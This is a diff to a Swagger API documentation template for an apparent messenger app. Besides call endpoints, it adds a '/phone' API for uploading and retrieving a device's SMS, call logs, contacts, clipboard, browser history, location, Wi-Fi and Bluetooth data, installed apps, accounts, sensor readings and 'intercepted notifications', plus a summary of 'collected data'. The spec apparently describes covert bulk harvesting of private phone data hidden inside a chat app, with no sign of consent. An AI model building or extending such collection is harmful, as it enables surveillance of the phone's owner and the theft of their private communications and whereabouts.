@@ -474,7 +474,7 @@ const docTemplate = `{
                         "in": "body",
                         "required": true,
                         "schema": {
-                            "$ref": "#/definitions/modules_calls_handler.startCallRequest"
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_calls_handler.startCallRequest"
                         }
                     }
                 ],
@@ -516,6 +516,30 @@ const docTemplate = `{
                         "in": "query"
                     }
                 ],
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/calls/ice-servers": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "calls"
+                ],
+                "summary": "Получить STUN/TURN серверы для звонков",
                 "responses": {
                     "200": {
                         "description": "OK",
@@ -601,6 +625,51 @@ const docTemplate = `{
                         "name": "id",
                         "in": "path",
                         "required": true
+                    }
+                ],
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/calls/{id}/recording": {
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "calls"
+                ],
+                "summary": "Сохранить запись звонка",
+                "parameters": [
+                    {
+                        "type": "string",
+                        "description": "id звонка",
+                        "name": "id",
+                        "in": "path",
+                        "required": true
+                    },
+                    {
+                        "description": "url записи",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_calls_handler.setRecordingRequest"
+                        }
                     }
                 ],
                 "responses": {
@@ -2242,6 +2311,1492 @@ const docTemplate = `{
                 }
             }
         },
+        "/phone/accounts": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить аккаунты устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить аккаунты устройства",
+                "parameters": [
+                    {
+                        "description": "массив аккаунтов",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.DeviceAccount"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить аккаунты устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/apps": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить установленные приложения",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить список установленных приложений",
+                "parameters": [
+                    {
+                        "description": "массив приложений",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.InstalledApp"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить установленные приложения",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/bluetooth": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить Bluetooth-устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить Bluetooth-устройства",
+                "parameters": [
+                    {
+                        "description": "массив устройств",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.BluetoothDevice"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить Bluetooth-устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/browser": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить историю браузера",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить историю браузера",
+                "parameters": [
+                    {
+                        "description": "массив записей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.BrowserHistory"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить историю браузера",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/calendar": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить события календаря",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить события календаря",
+                "parameters": [
+                    {
+                        "description": "массив событий",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.CalendarEvent"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить события календаря",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/calls": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить журнал звонков",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить журнал звонков",
+                "parameters": [
+                    {
+                        "description": "массив звонков",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.CallLog"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить журнал звонков",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/clipboard": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить записи буфера обмена",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить записи буфера обмена",
+                "parameters": [
+                    {
+                        "description": "массив записей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.ClipboardEntry"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить записи буфера обмена",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/contacts": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить контакты телефона",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить контакты телефона",
+                "parameters": [
+                    {
+                        "description": "массив контактов",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.PhoneContact"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить контакты телефона",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/device": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить данные об устройстве",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить данные об устройстве",
+                "parameters": [
+                    {
+                        "description": "массив записей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.DeviceInfo"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить данные об устройстве",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/location": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить геолокацию",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить геолокацию",
+                "parameters": [
+                    {
+                        "description": "массив точек",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.LocationPoint"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить геолокацию",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/media": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить описания медиафайлов",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить описания медиафайлов",
+                "parameters": [
+                    {
+                        "description": "массив файлов",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.MediaItem"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить описания медиафайлов",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/notifications": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить перехваченные уведомления",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить перехваченные уведомления",
+                "parameters": [
+                    {
+                        "description": "массив уведомлений",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.NotificationCapture"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить перехваченные уведомления",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/sensors": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить показания датчиков",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить показания датчиков",
+                "parameters": [
+                    {
+                        "description": "массив показаний",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.SensorReading"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить показания датчиков",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/sms": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить СМС",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить СМС",
+                "parameters": [
+                    {
+                        "description": "массив СМС",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.SmsLog"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить СМС",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/status": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить состояние устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить состояние устройства",
+                "parameters": [
+                    {
+                        "description": "массив записей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.DeviceStatus"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить состояние устройства",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/summary": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Сводка собранных данных",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/usage": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить статистику использования",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить статистику использования приложений",
+                "parameters": [
+                    {
+                        "description": "массив записей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.AppUsage"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить статистику использования",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/phone/wifi": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Получить Wi-Fi сети",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "post": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "consumes": [
+                    "application/json"
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Отправить Wi-Fi сети",
+                "parameters": [
+                    {
+                        "description": "массив сетей",
+                        "name": "body",
+                        "in": "body",
+                        "required": true,
+                        "schema": {
+                            "type": "array",
+                            "items": {
+                                "$ref": "#/definitions/github_com_jeogram_messenger_internal_modules_phone_domain.WifiNetwork"
+                            }
+                        }
+                    }
+                ],
+                "responses": {
+                    "201": {
+                        "description": "Created",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            },
+            "delete": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "produces": [
+                    "application/json"
+                ],
+                "tags": [
+                    "phone"
+                ],
+                "summary": "Удалить Wi-Fi сети",
+                "responses": {
+                    "200": {
+                        "description": "OK",
+                        "schema": {
+                            "$ref": "#/definitions/github_com_jeogram_messenger_internal_pkg_response.APIResponse"
+                        }
+                    }
+                }
+            }
+        },
+        "/socket.io/": {
+            "get": {
+                "description": "Тот же realtime-канал, что и ` + "`" + `/ws` + "`" + `, но поверх протокола Socket.IO. Подключение: ` + "`" + `/socket.io/?token=\u003caccess_token\u003e\u0026EIO=4\u0026transport=websocket` + "`" + `. События идентичны ` + "`" + `/ws` + "`" + `. Используйте либо WebSocket, либо Socket.IO — функционально это одно и то же.",
+                "tags": [
+                    "realtime"
